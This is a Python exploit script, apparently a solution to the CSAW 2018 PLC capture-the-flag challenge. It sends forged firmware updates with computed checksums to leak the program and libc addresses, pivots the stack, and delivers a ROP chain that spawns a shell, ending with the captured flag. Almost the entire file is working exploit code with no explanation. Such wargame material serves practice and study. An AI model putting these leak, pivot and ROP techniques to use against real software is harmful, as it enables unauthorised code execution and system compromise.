import interact
import struct

#  https://wargames.ret2.systems/csaw_2018_plc_challenge

def validate_checksum(code):
    r = 0
    for i in xrange(2,0x200):
        r = (((r << 0xc) | (r >> 4)) + i) ^ struct.unpack('H', code[2*i:][:2])[0]
        r &= 0xffff
    return struct.pack('H', r)

p = interact.Process()

# leak text
code = 'FWxx12'
code += '81'
code += '2a'*64
code += '2b'*4
code += '9'
code = code.ljust(0x400,'\x00')
code = code.replace('xx',validate_checksum(code))

p.readuntil(' ')
p.sendline('U')
p.readuntil(' ')
p.sendline(code)
p.readuntil('FIRMWARE UPDATE SUCCESSFUL!')
p.sendline('E')
p.readuntil('ENRICHMENT PROCEDURE IS RUNNING')
p.sendline('S')
p.readuntil('bbbb')
text = struct.unpack('Q', p.recv(6)+'\x00\x00')[0] - 0xab0
print 'text ' + hex(text)

# leak libc
code = 'FWxx12'
code += '81'
code += '2a'*64
code += '2b'*4
code += '2c'*8
code += '9'
code = code.ljust(0x400,'\x00')
code = code.replace('xx',validate_checksum(code))

p.readuntil(' ')
p.sendline('U')
p.readuntil(' ')
p.sendline(code)
p.readuntil('FIRMWARE UPDATE SUCCESSFUL!')
p.sendline('E')
p.readuntil('ENRICHMENT PROCEDURE IS RUNNING')
p.sendline('S')
p.readuntil('c'*8)
libc = struct.unpack('Q', p.recv(6)+'\x00\x00')[0] - 0x36ec0
print 'libc ' + hex(libc)

# rpm_alter -> pivot
pivot =text + 0xecb
pivot_pack = struct.pack('Q', pivot)
code = 'FWxx12'
code += '81'
code += '2a'*64
code += '2b'*4
code += '7'*69
for i in xrange(8):
    code += '2' + pivot_pack[i]
code += '9'
code = code.ljust(0x400,'\x00')
code = code.replace('xx',validate_checksum(code))

p.readuntil(' ')
p.sendline('U')
p.readuntil(' ')
p.sendline(code)
p.readuntil('FIRMWARE UPDATE SUCCESSFUL!')
p.sendline('E')

payload  = 't'*(0x400-0x70)
payload += struct.pack('Q', libc + 0x0000000000033544) # pop rax;0
payload += struct.pack('Q', 0x3b)
payload += struct.pack('Q', libc + 0x00000000001150c9)
payload += struct.pack('Q', 0x0)
payload += struct.pack('Q', 0x0)
payload += struct.pack('Q', libc + 0x0000000000021102) # pop rdi;
payload += struct.pack('Q', libc + 0x18cd57)
payload += struct.pack('Q', libc + 0x00000000000bc375) #syscall
payload  = payload.ljust(0x400, '\x00')
p.sendline(payload)

# p.sendline('cat flag')
# flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3}
p.interactive()
